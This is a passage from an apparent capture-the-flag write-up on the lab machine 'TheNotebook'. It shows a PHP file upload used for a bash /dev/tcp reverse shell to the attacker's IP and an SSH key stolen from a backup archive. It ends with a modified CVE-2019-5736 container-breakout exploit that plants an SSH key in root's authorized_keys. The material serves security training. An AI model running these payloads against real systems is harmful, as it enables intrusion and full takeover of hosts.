-<p><div class="img-container"><img src="imgs/image-20210807154529651.png" alt="image-20210807154529651"  /></div>
-</p>
-<p>The second note states that the server has regular backups set.</p>
-<p><div class="img-container"><img src="imgs/image-20210807154537751.png" alt="image-20210807154537751"  /></div>
-</p>
-<p>The <code>File Upload</code> button points to <code>/admin/upload</code>. This page provides an upload functionality.</p>
-<p><div class="img-container"><img src="imgs/image-20210807160019742.png" alt="image-20210807160019742"  /></div>
-</p>
-<h4 id="web-shell-upload">Web Shell Upload</h4>
-<p>According to the note titled with <code>Need to fix config</code>, I will try to drop the following PHP code on the upload page.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17» 
-$ <span class="nb">echo</span> <span class="s2">&#34;&lt;?php phpinfo(); ?&gt;&#34;</span> &gt; iamf-test.php 
-</code></pre></div><p>And the file gets uploaded.</p>
-<p><div class="img-container"><img src="imgs/image-20210807163411701.png" alt="image-20210807163411701"  /></div>
-</p>
-<p>The uploaded file can be accessed at <code>http://10.10.10.230/48101bbdd897877cc62b8704a293a436.php</code>. When I visit the link, it processes the PHP code.</p>
-<p><div class="img-container"><img src="imgs/image-20210807163428110.png" alt="image-20210807163428110"  /></div>
-</p>
-<p>I will change the payload with the following PHP reverse shell and then setup a netcat listener.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">system</span><span class="p">(</span><span class="s2">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.17/53 0&gt;&amp;1&#39;&#34;</span><span class="p">)</span> <span class="cp">?&gt;</span><span class="err">
-</span></code></pre></div><p>When I get the file URL, I will use <code>curl</code> to trigger the reverse shell.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17» 
-$ curl -s http://10.10.10.230/11ee6b411f33fe8f9c49d1a02e5720b7.php
-</code></pre></div><p>Now on my listener, I have an interactive shell access as <code>www-data</code> .</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17» 
-$ nc -nvlp <span class="m">53</span>
-listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
-connect to <span class="o">[</span>10.10.14.17<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.230<span class="o">]</span> <span class="m">39698</span>
-bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>1294<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
-bash: no job control in this shell
-www-data@thenotebook:~/html$ 
-</code></pre></div><h4 id="shell-upgrade">Shell Upgrade</h4>
-<p>I will upgrade my shell to fully interactive one.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@thenotebook:~/html$ which script
-which script
-/usr/bin/script
-www-data@thenotebook:~/html$ script /dev/null -c bash
-script /dev/null -c bash
-Script started, file is /dev/null
-www-data@thenotebook:~/html$ ^Z
-<span class="o">[</span>1<span class="o">]</span>  + <span class="m">5987</span> suspended  nc -nvlp <span class="m">53</span>
-→ kali@kali «thenotebook» «10.10.14.17» 
-$ stty raw -echo<span class="p">;</span><span class="nb">fg</span>
-<span class="o">[</span>1<span class="o">]</span>  + <span class="m">5987</span> continued  nc -nvlp <span class="m">53</span>
-
-www-data@thenotebook:~/html$ stty rows <span class="m">30</span> cols <span class="m">106</span>
-www-data@thenotebook:~/html$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
-</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
-<h3 id="shell-as-noah">Shell as noah</h3>
-<h4 id="enumeration-1">Enumeration</h4>
-<p>Based on the previous admin notes, I start with enumeration of readable file that contains &ldquo;backup&rdquo; string. One that stands out is <code>/var/backups/home.tar.gz</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@thenotebook:~/html$ find / -type f -readable 2&gt;/dev/null <span class="p">|</span> grep -i <span class="s2">&#34;backup&#34;</span>
-...<span class="o">[</span>SNIP<span class="o">]</span>...
-/var/backups/home.tar.gz
-...<span class="o">[</span>SNIP<span class="o">]</span>...
-</code></pre></div><p>I will grab that file to my attacking machine. The file contains an SSH private key for user <code>noah</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «loot» «10.10.14.17» 
-$ tar -zxvf home.tar.gz
-home/
-home/noah/
-home/noah/.bash_logout
-home/noah/.cache/
-home/noah/.cache/motd.legal-displayed
-home/noah/.gnupg/
-home/noah/.gnupg/private-keys-v1.d/
-home/noah/.bashrc
-home/noah/.profile
-home/noah/.ssh/
-home/noah/.ssh/id_rsa
-home/noah/.ssh/authorized_keys
-home/noah/.ssh/id_rsa.pub
-</code></pre></div><h4 id="ssh---noah">SSH - noah</h4>
-<p>With the obtained private key, I can SSH login as <strong>noah</strong> .</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17» 
-$ ssh -i loot/home/noah/.ssh/id_rsa noah@10.10.10.230
-Welcome to Ubuntu 18.04.5 LTS <span class="o">(</span>GNU/Linux 4.15.0-151-generic x86_64<span class="o">)</span>
-
-...<span class="o">[</span>SNIP<span class="o">]</span>...
-
-  System information as of Sat Aug  <span class="m">7</span> 09:57:29 UTC <span class="m">2021</span>
-
-  System load:  0.03              Processes:              <span class="m">184</span>
-  Usage of /:   46.1% of 7.81GB   Users logged in:        <span class="m">0</span>
-  Memory usage: 19%               IP address <span class="k">for</span> ens160:  10.10.10.230
-  Swap usage:   0%                IP address <span class="k">for</span> docker0: 172.17.0.1
-
-...<span class="o">[</span>SNIP<span class="o">]</span>...
-
-Last login: Wed Feb <span class="m">24</span> 09:09:34 <span class="m">2021</span> from 10.10.14.5
-noah@thenotebook:~$ id
-<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>noah<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>noah<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>noah<span class="o">)</span>
-</code></pre></div><p>User flag is done here.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">noah@thenotebook:~$ cat user.txt <span class="p">|</span> sed -s <span class="s1">&#39;s/[a-f]/\*/g&#39;</span>
-*881626900**9*271**710*266*9427*
-</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
-<h4 id="enumeration-2">Enumeration</h4>
-<p>User <strong>noah</strong> is allowed to run an interactive command and shell to a container called <code>webapp-dev01</code> as root.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">noah@thenotebook:~$ sudo -l
-Matching Defaults entries <span class="k">for</span> noah on thenotebook:
-    env_reset, mail_badpass,
-    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
-
-User noah may run the following commands on thenotebook:
-    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/docker <span class="nb">exec</span> -it webapp-dev01*
-</code></pre></div><p>And the currently installed docker is vulnerable to CVE-2019-5736. More details about the vulnerability can be read <a href="https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/">here</a>.</p>
-<pre tabindex="0"><code>noah@thenotebook:~$ docker version
-Client:
- Version:           18.06.0-ce
- API version:       1.38
- Go version:        go1.10.3
- Git commit:        0ffa825
- Built:             Wed Jul 18 19:09:54 2018
- OS/Arch:           linux/amd64
- Experimental:      false
-Got permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get http://%2Fvar%2Frun%2Fdocker.sock/v1.38/version: dial unix /var/run/docker.sock: connect: permission denied
-</code></pre><h4 id="docker-breakout-cve-2019-5736">Docker Breakout CVE-2019-5736</h4>
-<p>To exploit the docker CVE-2019-5736, I will be using this <a href="https://github.com/Frichetten/CVE-2019-5736-PoC.git">PoC</a> by Frichetten. The exploit&rsquo;s author also gives a nice writeup about what the exploit does.</p>
-<p>I will clone the PoC to my working directory.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.17» 
-$ git clone https://github.com/Frichetten/CVE-2019-5736-PoC.git
-Cloning into <span class="s1">&#39;CVE-2019-5736-PoC&#39;</span>...
-remote: Enumerating objects: 45, <span class="k">done</span>.
-remote: Total <span class="m">45</span> <span class="o">(</span>delta 0<span class="o">)</span>, reused <span class="m">0</span> <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused <span class="m">45</span>
-Receiving objects: 100% <span class="o">(</span>45/45<span class="o">)</span>, 1.69 MiB <span class="p">|</span> 254.00 KiB/s, <span class="k">done</span>.
-Resolving deltas: 100% <span class="o">(</span>10/10<span class="o">)</span>, <span class="k">done</span>.
-</code></pre></div><p>In the <code>main.go</code>, I will modify the payload variable with a bash script that will inject my SSH public key to root&rsquo;s <code>authorized_keys</code> file.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kd">var</span> <span class="nx">payload</span> <span class="p">=</span> <span class="s">&#34;#!/bin/bash \n mkdir -p /root/.ssh/ &amp;&amp; echo &#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINEBYhHk8/REIEriu8mkvQf4nihDP/deVl1j3Do/9R1H&#39; &gt; /root/.ssh/authorized_keys&#34;</span>
-</code></pre></div><p>I will compile the PoC and host it.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «CVE-2019-5736-PoC» «10.10.14.17» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
-$ go build -o breakout main.go <span class="o">&amp;&amp;</span> python3 -m http.server <span class="m">8080</span>
-Serving HTTP on 0.0.0.0 port <span class="m">8080</span> <span class="o">(</span>http://0.0.0.0:8080/<span class="o">)</span> ...
-</code></pre></div><p>On TheNotebook, I will have two SSH sessions. On the first SSH session, I will use it to download and execute the exploit within the container.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">noah@thenotebook:~$ sudo /usr/bin/docker <span class="nb">exec</span> -it webapp-dev01 bash
-root@0f4c2517af40:/opt/webapp# wget -q 10.10.14.17:8080/breakout <span class="o">&amp;&amp;</span> chmod +x breakout
-root@0f4c2517af40:/opt/webapp# ./breakout
-<span class="o">[</span>+<span class="o">]</span> Overwritten /bin/sh successfully
-</code></pre></div><p>Then on the second session, I will run the sudo command.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">noah@thenotebook:~$ sudo /usr/bin/docker <span class="nb">exec</span> -it webapp-dev01 /bin/sh
-</code></pre></div><p>But then, on the container session, I get the following error:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@0f4c2517af40:/opt/webapp# ./breakout
-<span class="o">[</span>+<span class="o">]</span> Overwritten /bin/sh successfully
-<span class="o">[</span>+<span class="o">]</span> Found the PID: <span class="m">17638</span>
-<span class="o">[</span>+<span class="o">]</span> Found the PID: self
-strconv.Atoi: parsing <span class="s2">&#34;self&#34;</span>: invalid syntax
-</code></pre></div><p>To resolve that, at line 42 of the <code>main.go</code> file, I will add another condition to ignore PID with name &ldquo;self&rdquo;.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">f</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">pids</span> <span class="p">{</span>
-	<span class="nx">fbytes</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">ioutil</span><span class="p">.</span><span class="nf">ReadFile</span><span class="p">(</span><span class="s">&#34;/proc/&#34;</span> <span class="o">+</span> <span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">()</span> <span class="o">+</span> <span class="s">&#34;/cmdline&#34;</span><span class="p">)</span>
-	<span class="nx">fstring</span> <span class="o">:=</span> <span class="nb">string</span><span class="p">(</span><span class="nx">fbytes</span><span class="p">)</span>
-	<span class="k">if</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="nx">fstring</span><span class="p">,</span> <span class="s">&#34;runc&#34;</span><span class="p">)</span> <span class="p">{</span>
-		<span class="k">if</span> <span class="p">!</span><span class="nx">strings</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">(),</span> <span class="s">&#34;self&#34;</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// Added by me
-</span><span class="c1"></span>			<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;[+] Found the PID:&#34;</span><span class="p">,</span> <span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">())</span>
-			<span class="nx">found</span><span class="p">,</span> <span class="nx">err</span> <span class="p">=</span> <span class="nx">strconv</span><span class="p">.</span><span class="nf">Atoi</span><span class="p">(</span><span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">())</span>
-			<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
-				<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
-				<span class="k">return</span>
-			<span class="p">}</span>
-		<span class="p">}</span> <span class="c1">// end
-</span><span class="c1"></span>	<span class="p">}</span>
-<span class="p">}</span>
-</code></pre></div><p>I will re-compile the exploit and transfer it again to the container, and this time it works!</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@c8cf4072ca26:/opt/webapp# ./breakout 
-<span class="o">[</span>+<span class="o">]</span> Overwritten /bin/sh successfully
-<span class="o">[</span>+<span class="o">]</span> Found the PID: <span class="m">1729</span>
-<span class="o">[</span>+<span class="o">]</span> Getting file handle
-<span class="o">[</span>+<span class="o">]</span> Successfully got the file handle
-<span class="o">[</span>+<span class="o">]</span> Successfully got write handle <span class="p">&amp;</span><span class="o">{</span>0xc000444000<span class="o">}</span>
-root@c8cf4072ca26:/opt/webapp# 
-</code></pre></div><p><div class="img-container"><img src="imgs/image-20210807220201808.png" alt="image-20210807220201808"  /></div>
-</p>
-<blockquote>
-<p>Pay attention to <code>bash</code> and <code>/bin/sh</code></p>
-</blockquote>
-<h4 id="ssh---root">SSH - Root</h4>
-<p>Now I can SSH login as root using my own private keys.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17»  
-$ ssh root@10.10.10.230
-Welcome to Ubuntu 18.04.5 LTS <span class="o">(</span>GNU/Linux 4.15.0-151-generic x86_64<span class="o">)</span>
-
-...<span class="o">[</span>SNIP<span class="o">]</span>...
-
-  System load:  0.1               Processes:              <span class="m">190</span>
-  Usage of /:   46.1% of 7.81GB   Users logged in:        <span class="m">1</span>
-  Memory usage: 19%               IP address <span class="k">for</span> ens160:  10.10.10.230
-  Swap usage:   0%                IP address <span class="k">for</span> docker0: 172.17.0.1
-
-
-...<span class="o">[</span>SNIP<span class="o">]</span>...
-
-Last login: Fri Jul <span class="m">23</span> 14:27:18 <span class="m">2021</span>
-root@thenotebook:~# 
 </code></pre></div>]]></content:encoded>
     </item>
     
